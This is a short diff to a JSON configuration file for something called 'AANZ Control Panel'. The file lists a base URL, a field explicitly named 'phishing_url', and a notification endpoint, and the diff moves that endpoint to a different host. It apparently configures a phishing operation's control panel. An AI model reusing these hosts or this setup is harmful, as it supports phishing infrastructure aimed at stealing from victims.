@@ -1,7 +1,7 @@
 {
   "base_url": "http://dash.yilzi.tech:2099",
   "phishing_url": "http://xii.aanzload.my.id:2001",
-  "base_notif": "http://xii.aanzload.my.id:2002",
+  "base_notif": "http://dash.yilzi.tech:2766",
   "version": "1.0.0",
   "app_name": "AANZ Control Panel",
   "endpoints": {
